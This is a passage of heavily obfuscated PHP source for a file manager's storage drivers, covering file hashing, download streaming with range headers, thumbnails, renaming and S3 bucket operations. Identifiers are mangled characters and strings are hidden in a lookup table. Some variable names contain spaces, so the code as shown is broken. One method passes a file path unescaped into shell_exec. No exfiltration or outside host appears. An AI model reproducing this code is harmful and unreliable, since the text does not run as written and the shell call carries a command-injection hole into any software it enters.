$¾ÖŞ¯ƒÒ .= $this->fileSubstr($€é°Ç§, $«¢ó«áê - $‘éıõê–, $‘éıõê–); return md5($¾ÖŞ¯ƒÒ) . $«¢ó«áê; } public static $md5Cache = array(); public function hashMd5($õÈÛİ—ª) { if (!$õÈÛİ—ª) { return md5($_SERVER[ÏéâËõ‘][12]); } $õÈÛİ—ª = $this->iconvSystem($õÈÛİ—ª); if (isset(self::$md5Cache[$õÈÛİ—ª])) { return self::$md5Cache[$õÈÛİ—ª]; } self::$md5Cache[$õÈÛİ—ª] = $this->hashMd5Shell($õÈÛİ—ª); if (!self::$md5Cache[$õÈÛİ—ª]) { self::$md5Cache[$õÈÛİ—ª] = @md5_file($õÈÛİ—ª); } return self::$md5Cache[$õÈÛİ—ª]; } private function hashMd5Shell($âÜÚ²íğ) { $¹†±ÔÂ© =& $_SERVER[ÏéâËõ‘]; if (!$âÜÚ²íğ) { return md5($¹†±ÔÂ©[12]); } if (!function_exists($¹†±ÔÂ©[98])) { return !1; } $ÖŸÓõ†” = array($¹†±ÔÂ©[99], $¹†±ÔÂ©[100]); $ÊËÁÏ× = Cache::get($¹†±ÔÂ©[101]); if (!$ÊËÁÏ×) { $É‰€„Ÿ› = BASIC_PATH . $¹†±ÔÂ©[102]; $“ä†§çĞ = md5_file($É‰€„Ÿ›); $ÊËÁÏ× = $¹†±ÔÂ©[103]; foreach ($ÖŸÓõ†” as $Ş™×ÙÖ») { $ÚºªàÍ = shell_exec($Ş™×ÙÖ» . "\x20\42{$É‰€„Ÿ›}\x22"); if ($ÚºªàÍ && substr(trim($ÚºªàÍ), 0, 32) == $“ä†§çĞ) { $ÊËÁÏ× = $Ş™×ÙÖ»; break; } } Cache::set($¹†±ÔÂ©[101], $ÊËÁÏ×, 3600); } if ($ÊËÁÏ× == $¹†±ÔÂ©[103]) { return !1; } $ÚºªàÍ = shell_exec($ÊËÁÏ× . "\40\42{$âÜÚ²íğ}\42"); $ÚºªàÍ = str_replace($¹†±ÔÂ©[104], $¹†±ÔÂ©[12], $ÚºªàÍ); return substr($ÚºªàÍ, 0, 32); } public function link($‚œîÆ) { return $‚œîÆ; } public function fileOut($ĞÖ–˜İ¥, $¬È»¨ˆ = false, $ŒşÕ€Ü© = false, $²›×Öøù = '') { $«›ø¯óÖ =& $_SERVER[ÏéâËõ‘]; $this->cacheMethod(null, null); if (!$ĞÖ–˜İ¥ || !$this->exist($ĞÖ–˜İ¥)) { show_json(LNG($«›ø¯óÖ[105]), !1, $ŒşÕ€Ü©); } $»Ûèíï = $this->getType() == $«›ø¯óÖ[106]; $“¼Ä—×À = $GLOBALS[$«›ø¯óÖ[6]][$«›ø¯óÖ[89]][$«›ø¯óÖ[107]][$«›ø¯óÖ[108]]; $·ìî½öŠ = (double) $GLOBALS[$«›ø¯óÖ[6]][$«›ø¯óÖ[89]][$«›ø¯óÖ[107]][$«›ø¯óÖ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ôˆ†‰£ = $this->infoFull($ĞÖ–˜İ¥); $èÅÃŸÚ‘ = $Ôˆ†‰£[$«›ø¯óÖ[76]]; $Ô‡’üÈÙ = gmdate($«›ø¯óÖ[110], $Ôˆ†‰£[$«›ø¯óÖ[85]]); $’«‹º = $ŒşÕ€Ü© ? $ŒşÕ€Ü© : $this->iconvApp($Ôˆ†‰£[$«›ø¯óÖ[32]]); $ç§ºíÊÑ = 0; $£’¹ÉÓÃ = $èÅÃŸÚ‘ - 1; $ÓÕ˜êğ¹ = $this->ext($’«‹º); if (in_array($ÓÕ˜êğ¹, array($«›ø¯óÖ[111], $«›ø¯óÖ[112], $«›ø¯óÖ[113], $«›ø¯óÖ[114]))) { $ÓÕ˜êğ¹ = $«›ø¯óÖ[115]; } if (in_array($ÓÕ˜êğ¹, array($«›ø¯óÖ[116]))) { $ÓÕ˜êğ¹ = $«›ø¯óÖ[117]; } if (!$²›×Öøù) { $²›×Öøù = md5($Ô‡’üÈÙ . $this->hashSimple($ĞÖ–˜İ¥)); } $²›×Öøù = $«›ø¯óÖ[118] . $²›×Öøù . $«›ø¯óÖ[118]; $õí¢©¥ = get_file_mime($ÓÕ˜êğ¹); $Ç¾ƒîš× = !0; $Ç¾ƒîš× = isset($_GET[$«›ø¯óÖ[119]]) ? !1 : !0; if ($¬È»¨ˆ === !1 && !mime_support($õí¢©¥)) { $õí¢©¥ = $«›ø¯óÖ[120]; } header($«›ø¯óÖ[121]); header($«›ø¯óÖ[122] . $õí¢©¥); $ñ³ˆÅÕŠ = rawurlencode($’«‹º); $ñ³ˆÅÕŠ = $«›ø¯óÖ[118] . $ñ³ˆÅÕŠ . $«›ø¯óÖ[123] . $ñ³ˆÅÕŠ; if ($¬È»¨ˆ) { header($«›ø¯óÖ[124]); header($«›ø¯óÖ[125] . $ñ³ˆÅÕŠ); } else { if ($Ç¾ƒîš×) { header($«›ø¯óÖ[126] . $ñ³ˆÅÕŠ); } } header($«›ø¯óÖ[127] . gmdate($«›ø¯óÖ[110], time() + 3600 * 24 * 30) . $«›ø¯óÖ[128]); header($«›ø¯óÖ[129]); header($«›ø¯óÖ[130]); header($«›ø¯óÖ[131]); if (isset($_SERVER[$«›ø¯óÖ[132]]) && strtotime($_SERVER[$«›ø¯óÖ[132]]) == $Ôˆ†‰£[$«›ø¯óÖ[85]]) { header($«›ø¯óÖ[133], !0, 304); die; } if (isset($_SERVER[$«›ø¯óÖ[134]]) && $_SERVER[$«›ø¯óÖ[134]] == $²›×Öøù) { header($«›ø¯óÖ[135] . $²›×Öøù, !0, 304); die; } header($«›ø¯óÖ[135] . $²›×Öøù); header($«›ø¯óÖ[136] . $Ô‡’üÈÙ . $«›ø¯óÖ[128]); header($«›ø¯óÖ[137] . $’«‹º); header($«›ø¯óÖ[138]); header($«›ø¯óÖ[139] . $èÅÃŸÚ‘); header($«›ø¯óÖ[140]); if (!$¬È»¨ˆ && $ÓÕ˜êğ¹ == $«›ø¯óÖ[141]) { if ($èÅÃŸÚ‘ > 1024 * 1024 * 5) { die; } $ñé‹ÍÔ“ = $this->getContent($ĞÖ–˜İ¥); $ñé‹ÍÔ“ = Html::clearSVG($ñé‹ÍÔ“); header($«›ø¯óÖ[142] . strlen($ñé‹ÍÔ“)); echo $ñé‹ÍÔ“; die; } $êÔÉùÈ¯ = strtolower($_SERVER[$«›ø¯óÖ[143]]); if ($»Ûèíï && $êÔÉùÈ¯ && $“¼Ä—×À) { if (strstr($êÔÉùÈ¯, $«›ø¯óÖ[144])) { header($«›ø¯óÖ[145] . $ĞÖ–˜İ¥); } else { if (strstr($êÔÉùÈ¯, $«›ø¯óÖ[146])) { header($«›ø¯óÖ[147] . $ĞÖ–˜İ¥); } else { if (strstr($êÔÉùÈ¯, $«›ø¯óÖ[148])) { header($«›ø¯óÖ[149] . $ĞÖ–˜İ¥); } } } if ($·ìî½öŠ) { header($«›ø¯óÖ[150] . $·ìî½öŠ); } return; } if (isset($_SERVER[$«›ø¯óÖ[151]])) { if (preg_match($«›ø¯óÖ[152], $_SERVER[$«›ø¯óÖ[151]], $ÂŞñÙ ´)) { $ç§ºíÊÑ = intval($ÂŞñÙ ´[1]); if (!empty($ÂŞñÙ ´[2])) { $£’¹ÉÓÃ = intval($ÂŞñÙ ´[2]); } } header($«›ø¯óÖ[153]); header("\x43\x6f\x6e\164\x65\156\164\55\122\141\156\147\x65\72\40\x62\x79\164\x65\x73\x20{$ç§ºíÊÑ}\x2d{$£’¹ÉÓÃ}\57" . $èÅÃŸÚ‘); } else { header($«›ø¯óÖ[154]); } header($«›ø¯óÖ[155]); $±¥Îˆ’ = !0; if ($_SERVER[$«›ø¯óÖ[156]] == $«›ø¯óÖ[157] && $èÅÃŸÚ‘ > 1204 * 1024 * 1024 * 2) { $±¥Îˆ’ = !1; } if ($±¥Îˆ’) { header($«›ø¯óÖ[158] . ($£’¹ÉÓÃ - $ç§ºíÊÑ + 1)); } if ($_SERVER[$«›ø¯óÖ[159]] == $«›ø¯óÖ[160]) { return; } $ºÜÎÊ”Õ = 1024 * 100; $ÎŸšãÎÓ = 0; if ($·ìî½öŠ) { $ÎŸšãÎÓ = intval(1000 * 1000 * ($ºÜÎÊ”Õ / $·ìî½öŠ)); } while ($ç§ºíÊÑ <= $£’¹ÉÓÃ) { $‚ê‘¤¹ = timeFloat(); check_abort(); $èà›”úŠ = $£’¹ÉÓÃ - $ç§ºíÊÑ + 1; if ($èà›”úŠ <= $ºÜÎÊ”Õ) { $ºÜÎÊ”Õ = $èà›”úŠ; } echo $this->fileSubstr($ĞÖ–˜İ¥, $ç§ºíÊÑ, $ºÜÎÊ”Õ); $ç§ºíÊÑ += $ºÜÎÊ”Õ; if ($ºÜÎÊ”Õ == $èà›”úŠ) { $ç§ºíÊÑ = $£’¹ÉÓÃ + 1; } if ($ÎŸšãÎÓ) { $£„ÖÍáÍ = intval(1000 * 1000 * (timeFloat() - $‚ê‘¤¹)); $å ö—íÕ = $ÎŸšãÎÓ - $£„ÖÍáÍ; if ($å ö—íÕ > 5) { usleep($å ö—íÕ); } } } } public function fileOutServer($ˆµ‡è»İ, $Õ§çÔúş = false, $ÙºïöÔæ = false, $™ÆŠôÉ› = '') { $this->fileOut($ˆµ‡è»İ, $Õ§çÔúş, $ÙºïöÔæ, $™ÆŠôÉ›); } public function fileOutLink($êò°) { header($_SERVER[ÏéâËõ‘][161] . $êò°); die; } public function cacheMethod($èÀè ¯î, $Æ±Ô°¹, $ç¼Çˆ„ = null) { $ó·ø‰œç =& $_SERVER[ÏéâËõ‘]; static $àï²íö = array(); $•‰™İÕ = $Æ±Ô°¹ ? ltrim($this->getPathOuter($Æ±Ô°¹), $ó·ø‰œç[8]) : $ó·ø‰œç[12]; $­Ë¿—¹ò = $ó·ø‰œç[162] . $èÀè ¯î . $ó·ø‰œç[163] . rtrim($•‰™İÕ, $ó·ø‰œç[8]); if (is_null($èÀè ¯î)) { $àï²íö = array(); return; } if (is_null($Æ±Ô°¹)) { foreach ($àï²íö as $­Ë¿—¹ò => $âì–ê¦è) { if (!strstr($­Ë¿—¹ò, $ó·ø‰œç[162] . $èÀè ¯î . $ó·ø‰œç[164])) { continue; } unset($àï²íö[$­Ë¿—¹ò]); } return; } if (!is_null($ç¼Çˆ„)) { $àï²íö[$­Ë¿—¹ò] = $ç¼Çˆ„; return; } $„¬ÛÛ·† = isset($àï²íö[$­Ë¿—¹ò]) ? $àï²íö[$­Ë¿—¹ò] : null; if (!is_null($„¬ÛÛ·†)) { return $„¬ÛÛ·†; } $„¬ÛÛ·† = $this->{$èÀè ¯î}($Æ±Ô°¹); $àï²íö[$­Ë¿—¹ò] = $„¬ÛÛ·†; return $„¬ÛÛ·†; } public function cacheMethodInfoSet($ü›áÎ‚ı, $ÃÃø™©, $•şÈÒ· = false) { $œìà¦äÙ =& $_SERVER[ÏéâËõ‘]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($œìà¦äÙ[165], $ü›áÎ‚ı, $ÃÃø™©); $this->cacheMethod($œìà¦äÙ[166], $ü›áÎ‚ı, $ÃÃø™© ? !1 : !0); if (is_array($•şÈÒ·)) { $this->cacheMethod($œìà¦äÙ[167], $ü›áÎ‚ı, $•şÈÒ·); } } public function fileOutImage($ÖÑ¸—Ëâ, $¨ÁÑ¦³ = 250) { $¡—¾ô« =& $_SERVER[ÏéâËõ‘]; set_timeout(); if (substr($ÖÑ¸—Ëâ, 0, 4) == $¡—¾ô«[148]) { $this->fileOutLink($ÖÑ¸—Ëâ); } $ŸÁ¤¹ˆğ = $this->info($ÖÑ¸—Ëâ); $œÙ³Äß¢ = $ŸÁ¤¹ˆğ[$¡—¾ô«[32]]; $Œâ¸õ£ = !1; if (isset($GLOBALS[$¡—¾ô«[168]]) && $GLOBALS[$¡—¾ô«[168]][$¡—¾ô«[84]] == $ŸÁ¤¹ˆğ[$¡—¾ô«[84]]) { $†²¿½Áº = $GLOBALS[$¡—¾ô«[168]][$¡—¾ô«[169]]; if (!$ŸÁ¤¹ˆğ[$¡—¾ô«[170]]) { $ŸÁ¤¹ˆğ[$¡—¾ô«[170]] = $GLOBALS[$¡—¾ô«[168]]; } if (isset($†²¿½Áº[$¡—¾ô«[171]])) { if ($†²¿½Áº[$¡—¾ô«[171]] <= $¨ÁÑ¦³ && $†²¿½Áº[$¡—¾ô«[172]] <= $¨ÁÑ¦³) { $Œâ¸õ£ = !0; } } $œÙ³Äß¢ = $ŸÁ¤¹ˆğ[$¡—¾ô«[170]][$¡—¾ô«[32]]; } if ($ŸÁ¤¹ˆğ[$¡—¾ô«[76]] <= 1024 * 50 || $Œâ¸õ£ || !function_exists($¡—¾ô«[173]) || $ŸÁ¤¹ˆğ[$¡—¾ô«[174]] == $¡—¾ô«[175]) { return $this->fileOut($ÖÑ¸—Ëâ, !1, $œÙ³Äß¢); } if (isset($ŸÁ¤¹ˆğ[$¡—¾ô«[170]][$¡—¾ô«[176]])) { $“›€ƒñ» = $ŸÁ¤¹ˆğ[$¡—¾ô«[170]][$¡—¾ô«[176]]; } else { if (isset($ŸÁ¤¹ˆğ[$¡—¾ô«[170]][$¡—¾ô«[177]])) { $“›€ƒñ» = $ŸÁ¤¹ˆğ[$¡—¾ô«[170]][$¡—¾ô«[177]]; } } if (!$“›€ƒñ») { $“›€ƒñ» = md5("{$ŸÁ¤¹ˆğ[$¡—¾ô«[32]]}\x5f{$ŸÁ¤¹ˆğ[$¡—¾ô«[84]]}\x5f{$ŸÁ¤¹ˆğ[$¡—¾ô«[76]]}\137{$¨ÁÑ¦³}"); } $æ‘…·® = "{$“›€ƒñ»}\137{$¨ÁÑ¦³}\x2e\160\156\147"; if (!($»ª›áñœ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $¡—¾ô«[178]))) { $‡´áÖÓú = IO::mkdir(IO_PATH_SYSTEM_TEMP . $¡—¾ô«[179]); } else { $‡´áÖÓú = KodIO::make($»ª›áñœ); } if ($»ª›áñœ = IO::fileNameExist($‡´áÖÓú, $æ‘…·®)) { $ñŠ§“ÁŠ = KodIO::make($»ª›áñœ); return IO::fileOut($ñŠ§“ÁŠ, !1, $œÙ³Äß¢); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ñŠ§“ÁŠ = DATA_THUMB . $æ‘…·®; del_file($ñŠ§“ÁŠ); if (!@file_exists($ñŠ§“ÁŠ)) { $ŒŸÏàÇó = TEMP_FILES; if (!is_dir($ŒŸÏàÇó)) { mk_dir($ŒŸÏàÇó); } $©üå€ˆ¯ = $ŒŸÏàÇó . $“›€ƒñ» . $¡—¾ô«[10] . $ŸÁ¤¹ˆğ[$¡—¾ô«[174]]; if (!@file_exists($©üå€ˆ¯)) { $©üå€ˆ¯ = $this->download($ÖÑ¸—Ëâ, $©üå€ˆ¯); } ImageThumb::createThumb($©üå€ˆ¯, $ñŠ§“ÁŠ, $¨ÁÑ¦³, $¨ÁÑ¦³ * 10); } if (!file_exists($ñŠ§“ÁŠ) || filesize($ñŠ§“ÁŠ) < 100) { return @file_exists($©üå€ˆ¯) ? IO::fileOut($©üå€ˆ¯) : $this->fileOut($ÖÑ¸—Ëâ); } if (!($Í£Ëöœ = IO::move($ñŠ§“ÁŠ, $‡´áÖÓú))) { return IO::fileOut($ñŠ§“ÁŠ); } del_file($ñŠ§“ÁŠ); IO::fileOut($Í£Ëöœ); } public function fileOutImageServer($ˆÚÔ¦ãâ, $ÎÅ¤§²Ç = 250) { $this->fileOutImage($ˆÚÔ¦ãâ, $ÎÅ¤§²Ç); } public function fileNameAuto($Ñ·ôğ÷, $¼à”¡á, $ƒ¶¾ëæû = REPEAT_RENAME, $Áëéƒğ = false) { $¯ÔÜ™ş¯ =& $_SERVER[ÏéâËõ‘]; $³—åõ³ƒ = $Ñ·ôğ÷ === $¯ÔÜ™ş¯[12] ? $¼à”¡á : rtrim($Ñ·ôğ÷, $¯ÔÜ™ş¯[8]) . $¯ÔÜ™ş¯[8] . $¼à”¡á; if ($ƒ¶¾ëæû == REPEAT_REPLACE || !$this->exist($³—åõ³ƒ) || $Áëéƒğ && $ƒ¶¾ëæû != REPEAT_RENAME_FOLDER) { return $¼à”¡á; } if ($ƒ¶¾ëæû == REPEAT_SKIP) { return !1; } $í£Ü¢¢¿ = $¯ÔÜ™ş¯[10] . get_path_ext($¼à”¡á); $í£Ü¢¢¿ = $í£Ü¢¢¿ == $¯ÔÜ™ş¯[10] || $Áëéƒğ ? $¯ÔÜ™ş¯[12] : $í£Ü¢¢¿; $Ó µé¸Œ = 1; $Ú¨ÕîÔÂ = substr($¼à”¡á, 0, strlen($¼à”¡á) - strlen($í£Ü¢¢¿)); $Ää³ø¾ğ = $Ú¨ÕîÔÂ . "\50{$Ó µé¸Œ}\x29{$í£Ü¢¢¿}"; while ($this->exist(rtrim($Ñ·ôğ÷, $¯ÔÜ™ş¯[8]) . $¯ÔÜ™ş¯[8] . $Ää³ø¾ğ)) { $Ää³ø¾ğ = $Ú¨ÕîÔÂ . "\50{$Ó µé¸Œ}\51{$í£Ü¢¢¿}"; $Ó µé¸Œ++; } return $Ää³ø¾ğ; } private function fileNameAutoList($ìæ¡ëÎø, $£ÖÌ®, $÷·Çğ•ü = false) { $ËâÖø·¢ =& $_SERVER[ÏéâËõ‘]; $¾Ù©¾ = $this->listPath($ìæ¡ëÎø, !0); $¾Ù©¾ = array_merge($¾Ù©¾[$ËâÖø·¢[82]], $¾Ù©¾[$ËâÖø·¢[83]]); $¬šŠ‚˜‚ = array_to_keyvalue($¾Ù©¾, $ËâÖø·¢[12], $ËâÖø·¢[32]); $Ç³çòã¹ = $ËâÖø·¢[10] . get_path_ext($£ÖÌ®); $Ç³çòã¹ = $Ç³çòã¹ == $ËâÖø·¢[10] || $÷·Çğ•ü ? $ËâÖø·¢[12] : $Ç³çòã¹; $Ê›¨Ë“ = substr($£ÖÌ®, 0, strlen($£ÖÌ®) - strlen($Ç³çòã¹)); $ı›çåƒª = $Ê›¨Ë“ . "\50\60\51{$Ç³çòã¹}"; for ($à³ş×¨ = 1; $à³ş×¨ <= count($¬šŠ‚˜‚) + 1; $à³ş×¨++) { $ı›çåƒª = $Ê›¨Ë“ . "\x28{$à³ş×¨}\x29{$Ç³çòã¹}"; if (!in_array_not_case($ı›çåƒª, $¬šŠ‚˜‚)) { return $ı›çåƒª; } } return $ı›çåƒª; } public function listAllFiles($Æ¥›Ñı¼, $Û²úšŒ´, $…“ÕĞÙù = array()) { $ò«ˆ­…× =& $_SERVER[ÏéâËõ‘]; if (empty($Û²úšŒ´)) { return array(); } $üÖµù‰– = array(); $Æ¥›Ñı¼ = trim($Æ¥›Ñı¼, $ò«ˆ­…×[8]); foreach ($Û²úšŒ´ as $ÉòÖ—Š) { $îêäÉ‰ = ltrim(substr(trim($ÉòÖ—Š, $ò«ˆ­…×[8]), strlen($Æ¥›Ñı¼)), $ò«ˆ­…×[8]); $üÖµù‰– = array_merge($üÖµù‰–, $this->slicePath($îêäÉ‰)); } $¯ôò°óó = array(); foreach (array_unique($üÖµù‰–) as $ÉòÖ—Š) { $›ıµÔ‹ = array($ò«ˆ­…×[84] => $this->getPathOuter($ò«ˆ­…×[8] . $Æ¥›Ñı¼ . $ò«ˆ­…×[8] . $ÉòÖ—Š), $ò«ˆ­…×[75] => 1, $ò«ˆ­…×[76] => 0); if (substr($ÉòÖ—Š, -1) != $ò«ˆ­…×[8]) { $›ıµÔ‹[$ò«ˆ­…×[75]] = 0; $é¢îŸ÷ = $this->getPath($Æ¥›Ñı¼ . $ò«ˆ­…×[8] . $ÉòÖ—Š); $›ıµÔ‹[$ò«ˆ­…×[76]] = isset($…“ÕĞÙù[$é¢îŸ÷]) ? $…“ÕĞÙù[$é¢îŸ÷] : $this->size($é¢îŸ÷); } $¯ôò°óó[] = $›ıµÔ‹; } return $¯ôò°óó; } public function slicePath($µ©û€ˆ¯) { $ÔŸêÍ¾¢ =& $_SERVER[ÏéâËõ‘]; $…íÄ·© = explode($ÔŸêÍ¾¢[8], trim($µ©û€ˆ¯, $ÔŸêÍ¾¢[8])); $½‰Ü‡¥» = 0; do { ++$½‰Ü‡¥»; $Í£ƒõíà[] = implode($ÔŸêÍ¾¢[8], array_slice($…íÄ·©, 0, $½‰Ü‡¥»)) . $ÔŸêÍ¾¢[8]; } while ($½‰Ü‡¥» < count($…íÄ·©)); $Í£ƒõíà[count($…íÄ·©) - 1] = $µ©û€ˆ¯; return $Í£ƒõíà; } public function getHost() { $×Ù²©ü™ =& $_SERVER[ÏéâËõ‘]; $´ÆÇç“« = parse_url(trim($this->domain, $×Ù²©ü™[8])); $­Äñ·“œ = isset($´ÆÇç“«[$×Ù²©ü™[180]]) ? $´ÆÇç“«[$×Ù²©ü™[180]] : http_type(); $ı¢¦ĞÀÒ = isset($´ÆÇç“«[$×Ù²©ü™[181]]) ? $´ÆÇç“«[$×Ù²©ü™[181]] : $´ÆÇç“«[$×Ù²©ü™[84]]; if (isset($´ÆÇç“«[$×Ù²©ü™[182]])) { $ı¢¦ĞÀÒ .= $×Ù²©ü™[4] . $´ÆÇç“«[$×Ù²©ü™[182]]; } return $­Äñ·“œ . $×Ù²©ü™[183] . $ı¢¦ĞÀÒ; } public function pathEncode($­ğá¶ƒü) { $‘äıÎŠé =& $_SERVER[ÏéâËõ‘]; return str_replace($‘äıÎŠé[184], $‘äıÎŠé[8], rawurlencode($­ğá¶ƒü)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($úÙ§´‚¤) { set_timeout(); require_once SDK_DIR . $_SERVER[ÏéâËõ‘][185]; parent::__construct(); $this->_init($úÙ§´‚¤); } public function _init($ß¸¯ØšÏ) { foreach ($ß¸¯ØšÏ as $ÌÂ¥İÎÌ => $©‰×¥‹) { if (isset($this->{$ÌÂ¥İÎÌ})) { $this->{$ÌÂ¥İÎÌ} = $©‰×¥‹; } } $this->endpoint = $ß¸¯ØšÏ[$_SERVER[ÏéâËõ‘][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ú©¨ß¬í = "\x76\64") { $this->signVer = $ú©¨ß¬í; $this->client->setSignatureVersion($ú©¨ß¬í); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $«ÈçØÏ =& $_SERVER[ÏéâËõ‘]; $ú«š—Æ¬ = $this->getBucketCors(); if (!$ú«š—Æ¬ || !is_array($ú«š—Æ¬)) { return !1; } if ($ú«š—Æ¬[$«ÈçØÏ[187]] != $«ÈçØÏ[188] || $ú«š—Æ¬[$«ÈçØÏ[189]] != $«ÈçØÏ[188]) { return !1; } $Ñàà÷¡İ = array_map($«ÈçØÏ[190], $ú«š—Æ¬[$«ÈçØÏ[191]]); if (!is_array($Ñàà÷¡İ)) { $Ñàà÷¡İ = array(); } $‹šá¾Ä£ = array($«ÈçØÏ[192], $«ÈçØÏ[193], $«ÈçØÏ[194], $«ÈçØÏ[195], $«ÈçØÏ[196]); $‘ºÂäˆ = array_diff($‹šá¾Ä£, $Ñàà÷¡İ); return empty($‘ºÂäˆ); } public function mkfile($¡èŒ¤Òì, $ÜÏ÷ˆËØ = '', $Òº§à•¼ = REPEAT_RENAME) { $Ùñ‚îñ½ = $this->setContent($¡èŒ¤Òì, $ÜÏ÷ˆËØ); if ($Ùñ‚îñ½ !== !1) { return $this->getPathOuter($¡èŒ¤Òì); } return !1; } public function mkdir($½ÛîùÁÑ, $ìãáá×¾ = REPEAT_SKIP) { $î«²Áøº =& $_SERVER[ÏéâËõ‘]; if (empty($½ÛîùÁÑ) && $½ÛîùÁÑ !== $î«²Áøº[197]) { return !1; } if ($ìãáá×¾ && $this->_isFolder($½ÛîùÁÑ)) { return $this->getPathOuter($½ÛîùÁÑ); } $Ÿ¦Ó öî = $this->setContent($½ÛîùÁÑ, $î«²Áøº[12], !0); if ($Ÿ¦Ó öî !== !1) { return $this->getPathOuter($½ÛîùÁÑ); } return !1; } public function copyFile($À¶îÍçÔ, $ãùñ—Õ, $ÛÃµò· = array()) { $©Ç×ìè =& $_SERVER[ÏéâËõ‘]; $ûÎäÛÒ£ = $this->objectMeta($À¶îÍçÔ); if (!$ûÎäÛÒ£) { return !1; } if ($ûÎäÛÒ£[$©Ç×ìè[76]] <= 1024 * 1024 * 200) { $ß·ÁÏÕ’ = $this->client->copyObject($this->bucket, $À¶îÍçÔ, $this->bucket, $ãùñ—Õ, $©Ç×ìè[198], $ÛÃµò·); } else { $ß·ÁÏÕ’ = $this->client->multiCopyObject($this->bucket, $À¶îÍçÔ, $this->bucket, $ãùñ—Õ, $ÛÃµò·); } $ß·ÁÏÕ’ = $ß·ÁÏÕ’ ? $this->getPathOuter($ãùñ—Õ) : !1; return $ß·ÁÏÕ’; } public function moveFile($µÅî’˜İ, $‡ÇıÈá´) { if ($this->copyFile($µÅî’˜İ, $‡ÇıÈá´)) { $this->delFile($µÅî’˜İ); return $this->getPathOuter($‡ÇıÈá´); } return !1; } public function delFile($«œòÄˆ“) { return $this->client->deleteObject($this->bucket, $«œòÄˆ“); } public function delFolder($ºúİ‚ªè) { $ıÌõÙÊº =& $_SERVER[ÏéâËõ‘]; if (!$this->exist($ºúİ‚ªè)) { return !0; } $this->listItemCache = !1; $ËÙ‹ÎØ¬ = $this->fileList($ºúİ‚ªè); $this->listItemCache = !0; $ƒÇ£±¦³ = trim($ºúİ‚ªè, $ıÌõÙÊº[8]) . $ıÌõÙÊº[8]; if (!empty($ºúİ‚ªè) && $ºúİ‚ªè !== $ıÌõÙÊº[197] && !in_array($ƒÇ£±¦³, $ËÙ‹ÎØ¬[$ıÌõÙÊº[82]])) { $ËÙ‹ÎØ¬[$ıÌõÙÊº[82]][] = $ƒÇ£±¦³; } $Òè­­ê = $this->delByBatch($ËÙ‹ÎØ¬[$ıÌõÙÊº[83]]); if (!$Òè­­ê) { return !1; } $Òè­­ê = $this->delByBatch($ËÙ‹ÎØ¬[$ıÌõÙÊº[82]]); if (!$Òè­­ê) { return !1; } return $this->delFile($ƒÇ£±¦³); } private function delByBatch($×¢ÓşŠã) { foreach (array_chunk($×¢ÓşŠã, 1000) as $áˆß³“î) { $ã‡©ıœĞ = $this->client->deleteObjects($this->bucket, $áˆß³“î); if (!$ã‡©ıœĞ) { return !1; } } return !0; } public function rename($êåÛûå¸, $ˆâÈ¶¨ó) { return $this->renameObject($êåÛûå¸, $ˆâÈ¶¨ó); } public function listPath($­–áÂÈ, $Öñğ‹ıí = false) { $ŒË×ú¶ =& $_SERVER[ÏéâËõ‘]; $ô¶Ã­â÷ = $this->fileList($­–áÂÈ, $ŒË×ú¶[8], !0); foreach ($ô¶Ã­â÷[$ŒË×ú¶[82]] as $£äáêÊñ => $şè¬üÖ—) { $ô¶Ã­â÷[$ŒË×ú¶[82]][$£äáêÊñ] = $this->folderInfo($şè¬üÖ—, $Öñğ‹ıí, $şè¬üÖ—); } foreach ($ô¶Ã­â÷[$ŒË×ú¶[83]] as $£äáêÊñ => $şè¬üÖ—) { $ô¶Ã­â÷[$ŒË×ú¶[83]][$£äáêÊñ] = $this->fileInfo($şè¬üÖ—[$ŒË×ú¶[32]], $Öñğ‹ıí, $şè¬üÖ—); } return $ô¶Ã­â÷; } protected function infoChildren($ôıŞË©, &$ì¦œ¹úƒ) { $à¿¾¨•„ =& $_SERVER[ÏéâËõ‘]; $–Ëëœî = $this->fileList($ôıŞË©, $à¿¾¨•„[12], !0); $ì¦œ¹úƒ[$à¿¾¨•„[78]] += count($–Ëëœî[$à¿¾¨•„[82]]); $ì¦œ¹úƒ[$à¿¾¨•„[77]] += count($–Ëëœî[$à¿¾¨•„[83]]); foreach ($–Ëëœî[$à¿¾¨•„[83]] as $÷¢ÜâªÒ) { if (!$÷¢ÜâªÒ || !$÷¢ÜâªÒ[$à¿¾¨•„[76]]) { continue; } $ì¦œ¹úƒ[$à¿¾¨•„[76]] += $÷¢ÜâªÒ[$à¿¾¨•„[76]]; } } private function fileInfo($®íí˜›§, $‘…½Ş‡½ = false, $š§ÔÖ‰ = array()) { $üœø–ô =& $_SERVER[ÏéâËõ‘]; $çúôóçŸ = array($üœø–ô[32] => $this->pathThis($®íí˜›§), $üœø–ô[84] => $this->getPathOuter($®íí˜›§), $üœø–ô[33] => $üœø–ô[199], $üœø–ô[174] => $this->ext($®íí˜›§), $üœø–ô[76] => isset($š§ÔÖ‰[$üœø–ô[76]]) ? $š§ÔÖ‰[$üœø–ô[76]] : 0); if ($‘…½Ş‡½) { return $çúôóçŸ; } $çúôóçŸ[$üœø–ô[200]] = $çúôóçŸ[$üœø–ô[85]] = 0; $çúôóçŸ[$üœø–ô[201]] = $çúôóçŸ[$üœø–ô[202]] = !0; if (empty($š§ÔÖ‰)) { $š§ÔÖ‰ = $this->objectMeta($®íí˜›§); if (!$š§ÔÖ‰) { return $çúôóçŸ; } } if (isset($š§ÔÖ‰[$üœø–ô[203]])) { $çúôóçŸ[$üœø–ô[85]] = $š§ÔÖ‰[$üœø–ô[203]]; } if (isset($š§ÔÖ‰[$üœø–ô[76]])) { $çúôóçŸ[$üœø–ô[76]] = $š§ÔÖ‰[$üœø–ô[76]]; } return $çúôóçŸ; } private function folderInfo($ºİèôø, $Ş† ¯Ø = false, $É±×¯ê£ = array()) { $›ÜÛ•“µ =& $_SERVER[ÏéâËõ‘]; $±ò™Îàç = array($›ÜÛ•“µ[32] => 